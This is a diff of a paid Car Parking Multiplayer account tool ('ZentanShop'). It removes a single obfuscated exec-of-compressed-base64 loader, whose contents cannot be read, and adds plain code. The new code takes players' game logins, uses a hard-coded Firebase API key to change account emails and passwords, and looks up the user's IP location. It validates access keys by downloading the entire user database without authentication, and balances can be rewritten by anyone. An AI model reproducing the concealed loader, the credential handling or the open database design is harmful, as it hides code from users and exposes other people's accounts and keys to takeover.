@@ -1,1 +1,401 @@
-import base64,zlib;exec(zlib.decompress(base64.b64decode('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')))
+import getpass
+import re
+import sys
+import os
+import requests
+import json
+import time
+from rich.console import Console
+
+c = Console()
+
+# ═══════════════════════════════════════════════
+#  ⚙️  CONFIG
+# ═══════════════════════════════════════════════
+
+API_KEY = "AIzaSyAe_aOVT1gSfmHKBrorFvX4fRwN5nODXVA"
+SIGN_IN_URL = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={API_KEY}"
+UPDATE_URL = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={API_KEY}"
+
+FIREBASE_URL = "https://kayzen-1ff37-default-rtdb.firebaseio.com/users"
+CHANNEL = "ZentanShopChannel"
+CHAT = "ZentanShopChat"
+
+PRICES = {
+    1: 10000,   # change email
+    3: 5000,    # change password
+}
+
+# ═══════════════════════════════════════════════
+#  🎨 COLORS
+# ═══════════════════════════════════════════════
+
+class Colors:
+    RED = '\033[91m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    BLUE = '\033[94m'
+    MAGENTA = '\033[95m'
+    CYAN = '\033[96m'
+    WHITE = '\033[97m'
+    RESET = '\033[0m'
+    BOLD = '\033[1m'
+
+def color_text(text, color):
+    return f"{color}{text}{Colors.RESET}"
+
+def horizontal_colors(text):
+    result = ""
+    colors = [Colors.RED, Colors.GREEN, Colors.YELLOW, Colors.BLUE, Colors.MAGENTA, Colors.CYAN]
+    for i, char in enumerate(text):
+        result += f"{colors[i % len(colors)]}{char}{Colors.RESET}"
+    return result
+
+def is_email(e):
+    return re.match(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", e) is not None
+
+# ═══════════════════════════════════════════════
+#  🖼️  GOODBYE BANNER  (defined at top level!)
+# ═══════════════════════════════════════════════
+
+def goodbye_banner():
+    os.system('clear' if os.name == 'posix' else 'cls')
+    print(color_text(f"""
+╔══════════════════════════════════════════════════╗
+║                                                  ║
+║              ███████╗████████╗███████╗          ║
+║              ╚══███╔╝╚══██╔══╝██╔════╝          ║
+║                ███╔╝    ██║   ███████╗          ║
+║               ███╔╝     ██║   ╚════██║          ║
+║              ███████╗   ██║   ███████║          ║
+║              ╚══════╝   ╚═╝   ╚══════╝          ║
+║                                                  ║
+║             ✦ THANK YOU FOR USING ZTS ✦         ║
+║                                                  ║
+║              🚗  CAR PARKING MULTIPLAYER  🚗     ║
+║                       ⚡ CPM1 ⚡                  ║
+║                                                  ║
+║          📢 JOIN  @{CHANNEL}  |  @{CHAT}             ║
+║                                                  ║
+║              🔥 SEREKBOL BOSS 🔥                 ║
+║                                                  ║
+║                 ★ GOOD BYE ★                     ║
+║                                                  ║
+╚══════════════════════════════════════════════════╝
+""", Colors.GREEN))
+
+# ═══════════════════════════════════════════════
+#  🔐 FIREBASE AUTH
+# ═══════════════════════════════════════════════
+
+def sign_in(email, password):
+    try:
+        r = requests.post(
+            SIGN_IN_URL,
+            json={"email": email, "password": password, "returnSecureToken": True},
+            timeout=10,
+        )
+        data = r.json()
+        if r.status_code == 200:
+            return data.get("idToken"), data.get("email", email)
+        c.print(f"[bold red]Error:[/bold red] {data.get('error', {}).get('message', 'Auth failed')}")
+    except Exception as e:
+        c.print(f"[bold red]Net error:[/bold red] {e}")
+    return None, None
+
+def update_email(token, new_email):
+    try:
+        r = requests.post(
+            UPDATE_URL,
+            json={"idToken": token, "email": new_email, "returnSecureToken": True},
+            timeout=10,
+        )
+        data = r.json()
+        if r.status_code == 200:
+            c.print("[bold green]Email updated successfully![/bold green]")
+            return True, data.get("idToken", token), data.get("email", new_email)
+        error_msg = data.get('error', {}).get('message', 'Update failed')
+        c.print(f"[bold red]Error:[/bold red] {error_msg}")
+    except Exception as e:
+        c.print(f"[bold red]Net error:[/bold red] {e}")
+    return False, token, None
+
+def update_password(token, new_password):
+    try:
+        r = requests.post(
+            UPDATE_URL,
+            json={"idToken": token, "password": new_password, "returnSecureToken": True},
+            timeout=10,
+        )
+        data = r.json()
+        if r.status_code == 200:
+            c.print("[bold green]Password updated successfully![/bold green]")
+            return True, data.get("idToken", token), None
+        error_msg = data.get('error', {}).get('message', 'Update failed')
+        c.print(f"[bold red]Error:[/bold red] {error_msg}")
+    except Exception as e:
+        c.print(f"[bold red]Net error:[/bold red] {e}")
+    return False, token, None
+
+# ═══════════════════════════════════════════════
+#  🌐 LOCATION & FIREBASE
+# ═══════════════════════════════════════════════
+
+def get_location():
+    try:
+        response = requests.get("http://ip-api.com/json", timeout=10)
+        return response.json()
+    except:
+        return None
+
+def get_firebase_data():
+    try:
+        response = requests.get(f"{FIREBASE_URL}.json", timeout=10)
+        return response.json() or {}
+    except:
+        return {}
+
+def verify_access_key(access_key):
+    db = get_firebase_data()
+    for uid, user_data in db.items():
+        if isinstance(user_data, dict):
+            user_key = user_data.get('key')
+            if user_key is not None and str(user_key) == str(access_key):
+                if user_data.get('is_blocked') == True:
+                    return None, None, None, None, True
+                is_unlimited = user_data.get('is_unlimited', False)
+                balance = 999999 if is_unlimited else user_data.get('balance', 0)
+                if not isinstance(balance, (int, float)):
+                    balance = 0
+                tg_id = user_data.get('telegram_id', 'Unknown')
+                if tg_id == 'Unknown' or tg_id is None:
+                    tg_id = 'Not Linked'
+                return uid, tg_id, balance, is_unlimited, False
+    return None, None, None, None, False
+
+def update_balance(user_ref, new_balance):
+    try:
+        requests.patch(f"{FIREBASE_URL}/{user_ref}.json", json={"balance": new_balance}, timeout=10)
+        return True
+    except:
+        return False
+
+# ═══════════════════════════════════════════════
+#  🖼️  BANNER & INFO
+# ═══════════════════════════════════════════════
+
+def banner():
+    os.system('clear' if os.name == 'posix' else 'cls')
+
+    # ─── ZET LOGO ───
+    print(color_text("███████╗████████╗███████╗", Colors.CYAN))
+    print(color_text("╚══███╔╝╚══██╔══╝██╔════╝", Colors.CYAN))
+    print(color_text("  ███╔╝    ██║   ███████╗", Colors.CYAN))
+    print(color_text(" ███╔╝     ██║   ╚════██║", Colors.CYAN))
+    print(color_text("███████╗   ██║   ███████║", Colors.CYAN))
+    print(color_text("╚══════╝   ╚═╝   ╚══════╝", Colors.CYAN))
+    print()
+
+    # ─── CPM1 LOGO ───
+    print(color_text(" ██████╗██████╗ ███╗   ███╗", Colors.MAGENTA))
+    print(color_text("██╔════╝██╔══██╗████╗ ████║", Colors.MAGENTA))
+    print(color_text("██║     ██████╔╝██╔████╔██║", Colors.MAGENTA))
+    print(color_text("██║     ██╔═══╝ ██║╚██╔╝██║", Colors.MAGENTA))
+    print(color_text("╚██████╗██║     ██║ ╚═╝ ██║", Colors.MAGENTA))
+    print(color_text(" ╚═════╝╚═╝     ╚═╝     ╚═╝", Colors.MAGENTA))
+    print()
+
+    # ─── TITLE ───
+    print(color_text("              🚗 CPM1 🚗", Colors.GREEN))
+    print(color_text("        🔥 SEREKBOL BOSS 🔥", Colors.RED))
+    print(horizontal_colors("=" * 60))
+
+def show_info(email, access_key, tg_id, balance, is_unlimited, location):
+    print(color_text("\n========[ PLAYER DETAILS ]========", Colors.CYAN))
+    print(color_text(f">> Email      : {email}", Colors.GREEN))
+    print(color_text(f">> Name       : Player", Colors.GREEN))
+    print(color_text(f">> LocalID    : DEFAULT_ID", Colors.GREEN))
+    print(color_text(f">> Moneys     : 50,000,000", Colors.GREEN))
+    print(color_text(f">> Coins      : 500,000", Colors.GREEN))
+    print(color_text(f">> Car Count  : 220", Colors.GREEN))
+
+    print(color_text("\n========[ ACCESS KEY DETAILS ]========", Colors.CYAN))
+    print(color_text(f">> Access Key  : {access_key}", Colors.YELLOW))
+    print(color_text(f">> Telegram ID : {tg_id}", Colors.YELLOW))
+
+    if is_unlimited:
+        print(color_text(f">> Balance     : Unlimited", Colors.MAGENTA))
+    else:
+        print(color_text(f">> Balance     : {balance:,}", Colors.MAGENTA))
+
+    if location:
+        print(color_text("\n========[ LOCATION ]========", Colors.CYAN))
+        print(color_text(f">> IP Address : {location.get('query', 'Unknown')}", Colors.BLUE))
+        print(color_text(f">> Location   : {location.get('city', '')} {location.get('regionName', '')} {location.get('countryCode', '')}", Colors.BLUE))
+        print(color_text(f">> Country    : {location.get('country', '')} {location.get('zip', '')}", Colors.BLUE))
+
+    print(color_text("\n========[ MENU ]========", Colors.CYAN))
+    print(color_text("(01): Change email       10K", Colors.GREEN))
+    print(color_text("(03): Change password     5K", Colors.GREEN))
+    print(color_text("(05): Back to Home", Colors.YELLOW))
+    print(color_text("(0) : Exit From Tool", Colors.RED))
+    print(horizontal_colors("\n========[ ZentanShop ]========"))
+
+# ═══════════════════════════════════════════════
+#  🎯 MAIN
+# ═══════════════════════════════════════════════
+
+def main():
+    while True:
+        banner()
+
+        email = input(color_text("\n[?] Account Email: ", Colors.CYAN)).strip()
+        password = getpass.getpass(color_text("[?] Account Password: ", Colors.CYAN))
+        access_key = input(color_text("[?] Access key: ", Colors.CYAN)).strip()
+
+        if not is_email(email):
+            print(color_text("[!] Invalid email format!", Colors.RED))
+            time.sleep(2)
+            continue
+
+        if len(password) < 6:
+            print(color_text("[!] Password must be at least 6 characters!", Colors.RED))
+            time.sleep(2)
+            continue
+
+        print(color_text("\n[*] Trying to Login...", Colors.YELLOW))
+        time.sleep(1)
+
+        user_ref, tg_id, balance, is_unlimited, is_blocked = verify_access_key(access_key)
+
+        if is_blocked:
+            print(color_text("[!] TRY AGAIN.", Colors.RED))
+            print(color_text("[!] Note: This access key is blocked!", Colors.YELLOW))
+            time.sleep(3)
+            continue
+
+        if user_ref is None:
+            print(color_text("[!] TRY AGAIN.", Colors.RED))
+            print(color_text("[!] Note: make sure you filled out the fields correctly!", Colors.YELLOW))
+            time.sleep(3)
+            continue
+
+        token, cur_email = sign_in(email, password)
+
+        if not token:
+            print(color_text("[%] Trying to Login: TRY AGAIN. Note: make sure you filled out the fields correctly!", Colors.RED))
+            time.sleep(2)
+            continue
+
+        print(color_text("[%] Trying to Login: SUCCESSFUL", Colors.GREEN))
+        time.sleep(1)
+
+        # ═══════════════════════════════════
+        #  INNER MENU LOOP
+        # ═══════════════════════════════════
+        back_to_launcher = False
+
+        while True:
+            location = get_location()
+            banner()
+
+            if not is_unlimited and user_ref:
+                db = get_firebase_data()
+                balance = int(db.get(user_ref, {}).get('balance', 0))
+
+            show_info(cur_email, access_key, tg_id, balance, is_unlimited, location)
+
+            try:
+                choice = int(input(color_text("\n[?] Select a Service [0-5]: ", Colors.CYAN)))
+            except:
+                choice = -1
+
+            # ─── EXIT (0) ─────────────────────
+            if choice == 0:
+                answ = input(color_text("\n[?] DO YOU WANT TO EXIT? (y/n): ", Colors.CYAN)).lower()
+                if answ == "y":
+                    goodbye_banner()
+                    sys.exit()
+                else:
+                    continue
+
+            # ─── BACK TO HOME (5) ─────────────
+            if choice == 5:
+                print(color_text("\n[←] Returning to Main Menu...", Colors.YELLOW))
+                time.sleep(1)
+                back_to_launcher = True
+                break
+
+            # ─── VALIDATION ───────────────────
+            if choice not in [1, 3]:
+                print(color_text("INVALID CHOICE!", Colors.RED))
+                time.sleep(1)
+                continue
+
+            cost = PRICES.get(choice, 0)
+
+            # ─── PAID SERVICES ────────────────
+            if is_unlimited or balance >= cost:
+                if choice == 1:  # Change email
+                    new_email = input(color_text("[?] New email: ", Colors.CYAN)).strip()
+                    if not is_email(new_email):
+                        print(color_text("[!] Invalid email format!", Colors.RED))
+                        time.sleep(2)
+                        continue
+
+                    confirm_email = input(color_text("[?] Confirm email: ", Colors.CYAN)).strip()
+                    if new_email != confirm_email:
+                        print(color_text("[!] Emails don't match!", Colors.RED))
+                        time.sleep(2)
+                        continue
+
+                    ok, token, updated_email = update_email(token, new_email)
+                    if ok and updated_email:
+                        cur_email = updated_email
+                        if not is_unlimited:
+                            balance -= cost
+                            update_balance(user_ref, balance)
+                        print(color_text("[✓] Email changed successfully!", Colors.GREEN))
+                    time.sleep(2)
+
+                elif choice == 3:  # Change password
+                    new_password = getpass.getpass(color_text("[?] New password: ", Colors.CYAN))
+                    if len(new_password) < 6:
+                        print(color_text("[!] Password must be at least 6 characters!", Colors.RED))
+                        time.sleep(2)
+                        continue
+
+                    confirm_password = getpass.getpass(color_text("[?] Confirm password: ", Colors.CYAN))
+                    if new_password != confirm_password:
+                        print(color_text("[!] Passwords don't match!", Colors.RED))
+                        time.sleep(2)
+                        continue
+
+                    ok, token, _ = update_password(token, new_password)
+                    if ok:
+                        if not is_unlimited:
+                            balance -= cost
+                            update_balance(user_ref, balance)
+                        print(color_text("[✓] Password changed successfully!", Colors.GREEN))
+                    time.sleep(2)
+            else:
+                print(color_text(f"\nINSUFFICIENT BALANCE! Need {cost:,}", Colors.RED))
+                print(color_text(f"Your balance: {balance:,}", Colors.YELLOW))
+                time.sleep(2)
+
+        # ─── Return to launcher ───
+        if back_to_launcher:
+            break
+
+
+# ═══════════════════════════════════════════════
+#  🚀 ENTRY POINT
+# ═══════════════════════════════════════════════
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        goodbye_banner()
+        sys.exit()
+
